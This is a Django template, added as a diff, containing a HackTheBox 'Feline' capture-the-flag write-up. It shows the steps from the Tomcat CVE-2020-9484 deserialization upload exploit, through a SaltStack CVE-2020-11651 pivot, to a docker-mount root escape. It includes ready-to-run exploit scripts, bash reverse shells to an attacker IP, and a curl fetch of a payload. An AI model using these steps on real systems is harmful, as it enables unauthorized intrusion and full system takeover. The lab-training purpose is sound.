@@ -1,0 +1,301 @@
+{% extends 'writeapp/base.html' %}
+
+{% load static %}
+
+{% block content %}
+
+<div id="overlay" class="overlay"></div>
+<div class="container-fluid p-5">
+    <div class="row">
+        <div class="form-group col-md-12">
+            <h2>HacktheBox — Feline</h2>
+            <img src="{% static 'writeapp/img/feline.jpg' %}"  class="img-fluid" alt="" style="width:600px">
+            <br><br><br>
+            <p> <strong>About this box:</strong> </p>
+            <p>This is a difficult box if you have limited knowledge with docker and containers. </p>
+            <p>The initial foothold requires research as there is no straight forward PoC that will run off the bat.  </p>
+            <br>
+
+            <p> <strong>Summary:</strong> </p>
+            <ul>
+              <li>Nmap reveals ssh and port 8080 open running Apache Tomcat 9.0.27</li>
+              <li>There is an upload api that we can abuse using public exploit cve-2020-9484.</li>
+              <li> SaltStack vulnerability exploited for pivoting.</li>
+              <li>root flag obtained by spawning root shell using docker image. </li>
+            </ul>
+            <hr>
+
+        </div>
+
+        <div class="form-group col-md-12">
+          <p> <strong> Detailed Steps</strong> </p>
+          <p> Initial nmap</p>
+
+<pre class="code">
+<code>
+  root@kali:/opt/HTB/Feline/nmap# nmap -sC -sV 10.10.10.205 -oA /opt/HTB/Feline/nmap
+  Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 19:27 PDT
+  Nmap scan report for 10.10.10.205
+  Host is up (0.17s latency).
+  Not shown: 998 closed ports
+  PORT     STATE SERVICE VERSION
+  22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+  8080/tcp open  http    Apache Tomcat 9.0.27
+  |_http-title: VirusBucket
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code>
+</pre>
+
+          <br>
+          <p>It looks like we can upload a file.</p>
+          <img src="{% static 'writeapp/img/feline1.png' %}"  class="img-fluid" alt="">
+          <br><br>
+          <p>Tried upload a test image file and  used burp to check the HTTP traffic</p>
+          <img src="{% static 'writeapp/img/feline2.png' %}"  class="img-fluid" alt="">
+          <br><br>
+          <p>Googled for  tomcat 9.0.27 exploit</p>
+          <p>Found this :</p>
+          <a href="https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/">https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/</a>
+          <p>First created a payload.sh with reverseshell.</p>
+
+<pre class="code">
+<code>
+  root@kali:/opt/HTB/Feline# cat payload.sh
+  #!/bin/bash
+  bash -c "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1"
+
+</code>
+</pre>
+
+          <p>Then created a script to run exploit.</p>
+          <p>We used a tool called ysoserial to encode bash commands into serialized  java object. </p>
+          <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>
+          <br><br>
+          <img src="{% static 'writeapp/img/feline3.png' %}"  class="img-fluid" alt="">
+
+<pre class="code">
+<code>
+  #!/bin/bash
+
+  ##upload our payload to target and specify output file to /tmp/payload.sh ##
+  java -jar ysoserial.jar CommonsCollections2 "curl http://10.10.X.X:8000/payload.sh -o /tmp/payload.sh" > payload.session
+  curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/payload' -F 'image=@payload.session'
+  curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/payload'
+
+
+
+  ##make it executable ##
+  java -jar ysoserial.jar CommonsCollections2  "chmod 777 /tmp/payload.sh" > ch.session
+
+  curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/ch' -F 'image=@ch.session'
+  curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/ch'
+
+
+
+  ## then run it on target##
+  java -jar ysoserial.jar CommonsCollections2 "bash /tmp/payload.sh" > run.session
+  curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/run' -F 'image=@run.session'
+  curl 'http://10.10.10.205:8080/upload.jsp' -H 'Cookie: JSESSIONID=../../../../../opt/samples/uploads/run'
+</code>
+</pre>
+
+            <br>
+            <p>Got shell after running the script</p>
+
+<pre class="code">
+<code>
+  fsor@kali:~$ nc -nvlp 4444
+  listening on [any] 4444 ...
+  connect to [10.10.14.6] from (UNKNOWN) [10.10.10.205] 45022
+  bash: cannot set terminal process group (956): Inappropriate ioctl for device
+  bash: no job control in this shell
+  tomcat@VirusBucket:/opt/tomcat$
+</code>
+</pre>
+
+            <br>
+            <p>Common enum scripts does not yield any result.</p>
+            <p>So we focused on manually checking open ports and application associated with it .</p>
+
+<pre class="code">
+<code>
+  tomcat@VirusBucket:/$ <span style="color: #FEF316;"> netstat -tulpn | grep LISTEN </span>
+   netstat -tulpn | grep LISTEN
+  tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+  tcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN      -
+  tcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN      -
+  tcp        0      0 127.0.0.1:40859         0.0.0.0:*               LISTEN      -
+  tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+  tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      983/java
+  tcp6       0      0 :::8080                 :::*                    LISTEN      983/java
+  tcp6       0      0 :::22                   :::*                    LISTEN      -
+</code>
+</pre>
+
+        <br>
+        <p>Checked what program is running on 4505 and 4506.</p>
+        <p>Googled and found that it is running SaltStack.</p>
+        <p>SaltStack is an automation software tool.</p>
+        <br>
+        <p>There is a public exploit available for Salt</p>
+        <a href="https://github.com/jasperla/CVE-2020-11651-poc">https://github.com/jasperla/CVE-2020-11651-poc</a>
+        <br>
+        <p>We used chisel to tunnel port 4506 and 4505 from the target to our machine:</p>
+        <p>On our  Kali machine:</p>
+        <code>./chisel_amd64 server -p 8008 --reverse </code>
+        <br><br>
+        <p>On Target:</p>
+        <code>./chisel_amd64 client 10.10.14.6:8008    R:4505:127.0.0.1:4505 R:4506:127.0.0.1:4506</code>
+        <br><br>
+
+<pre class="code">
+<code>
+  tomcat@VirusBucket:/tmp$ chmod 777 chisel_amd64
+  chmod 777 chisel_amd64
+  tomcat@VirusBucket:/tmp$ ./chisel_amd64 client 10.10.14.6:8008    R:4505:127.0.0.1:4505 R:4506:127.0.0.1:4506
+  <8008    R:4505:127.0.0.1:4505 R:4506:127.0.0.1:4506
+  2020/09/20 23:01:36 client: Connecting to ws://10.10.14.6:8008
+  2020/09/20 23:01:37 client: Fingerprint 63:ca:f8:f2:b7:40:93:cf:fc:db:d5:9a:cb:5d:af:69
+  2020/09/20 23:01:38 client: Connected (Latency 165.12703ms)
+</code>
+</pre>
+
+        <br>
+        <p>Then we run the exploit on our machine. </p>
+
+<pre class="code">
+<code>
+  root@kali:/opt/HTB/Feline# <span style="color: #FEF316;">python3 exploit.py --master 127.0.0.1</span>
+  [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
+  [+] Checking salt-master (127.0.0.1:4506) status... ONLINE
+  [+] Checking if vulnerable to CVE-2020-11651... YES
+  [*] root key obtained: hccDpmnYv+5iLXH5sY8xlycy6C+elf8yqxKOpPVuI8fp/MIHYQj0pK9PiDC5Pco7Lvu+wWVi5V8=
+</code>
+</pre>
+
+          <p>The version of Salt is vulnerable,</p>
+          <br>
+          <p>We can run shell commands using the script</p>
+
+<pre class="code">
+<code>
+  root@kali:/opt/HTB/Feline# <span style="color: #FEF316;">python3 exploit.py --master  127.0.0.1 --exec "bash -c \"bash -i >& /dev/tcp/10.10.14.6/4444 0>&1\""</span>
+  [!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
+  [+] Checking salt-master (127.0.0.1:4506) status... ONLINE
+  [+] Checking if vulnerable to CVE-2020-11651... YES
+  [*] root key obtained: hccDpmnYv+5iLXH5sY8xlycy6C+elf8yqxKOpPVuI8fp/MIHYQj0pK9PiDC5Pco7Lvu+wWVi5V8=
+  [+] Attemping to execute bash -c "bash -i >& /dev/tcp/10.10.14.6/4444 0>&1" on 127.0.0.1
+  [+] Successfully scheduled job: 20200920105059439638
+</code>
+</pre>
+
+        <p>Back to our machine</p>
+
+<pre class="code">
+<code>
+  root@kali:/# nc -nvlp 4444
+  listening on [any] 4444 ...
+  connect to [10.10.14.6] from (UNKNOWN) [10.10.10.205] 57500
+  bash: cannot set terminal process group (13082): Inappropriate ioctl for device
+  bash: no job control in this shell
+
+  root@2d24bf61767c:~#
+</code>
+</pre>
+
+        <p>We can see that this is a different  host  that we connected to as the hostname is <code> 2d24bf61767c</code>,  and the initial machine that we accessed has a hostname of <code> VirusBucket:</code></p>
+        <p>This box is a container running on the same machine as <code> VirusBucket</code></p>
+        <p>No root.txt on root folder. There is a todo.txt</p>
+
+<pre class="code">
+<code>
+  root@2d24bf61767c:~# cat todo.txt
+  cat todo.txt
+  - Add saltstack support to auto-spawn sandbox dockers through events.
+  - Integrate changes to tomcat and make the service open to public.
+</code>
+</pre>
+
+          <br>
+          <p>Tried to run docker commands but there is no docker installed.</p>
+          <p>We will copy docker file  from the <code> VirusBucket</code> machine towards the <code> 2d24bf61767c</code> container</p>
+          <p>On <code> VirusBucket</code> , we run python3 httpserver on /usr/bin directory .</p>
+
+<pre class="code">
+<code>
+  tomcat@VirusBucket:/usr/bin$ <span style="color: #FEF316;">python3 -m http.server 7777 &</span>
+  python3 -m http.server 7777 &
+  [1] 61177
+</code>
+</pre>
+
+          <br>
+          <p>On <code> 2d24bf61767c</code> :</p>
+          <p>We copy the docker file from 172.17.0.1 which is one of the interface on <code> VirusBucket</code>, we can get the docker from any interface of the main machine.</p>
+          <p>We then make it executable  and checked  for  docker images. </p>
+
+<pre class="code">
+<code>
+  # <span style="color: #FEF316;">wget http://172.17.0.1:7777/docker</span>
+  wget http://172.17.0.1:7777/docker
+  --2020-09-20 11:59:11--  http://172.17.0.1:7777/docker
+  Connecting to 172.17.0.1:7777... connected.
+  HTTP request sent, awaiting response... 200 OK
+  Length: 85029616 (81M) [application/octet-stream]
+  Saving to: ‘docker’
+
+  docker              100%[===================>]  81.09M   432MB/s    in 0.2s
+
+  2020-09-20 11:59:11 (432 MB/s) - ‘docker’ saved [85029616/85029616]
+
+  # <span style="color: #FEF316;">chmod 777 docker</span>
+
+  # ./docker images
+  ./docker images
+  REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+  sandbox             latest              a24bb4013296        3 months ago        5.57MB
+  none                none                188a2704d8b0        4 months ago        1.06GB
+</code>
+</pre>
+
+
+            <p>We can see that there is an image called sandbox.</p>
+            <br>
+            <p>Using GTFObins, we can access root from the main host by spawning new shell .</p>
+            <a href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a>
+            <br>
+            <br>
+<pre class="code">
+<code>
+  #   <span style="color: #FEF316;">./docker run -v /:/mnt --rm -it sandbox  chroot /mnt sh</span>
+
+  # id
+  id
+  uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+
+
+  # cd /root
+  # cat root.txt
+  cat root.txt
+  e0ca3e6bcaaa3754058002e5435be582
+  # </code>
+</pre>
+
+
+
+
+
+
+
+
+
+
+
+
+        </div>
+    </div>
+</div>
+
+
+{% endblock %}
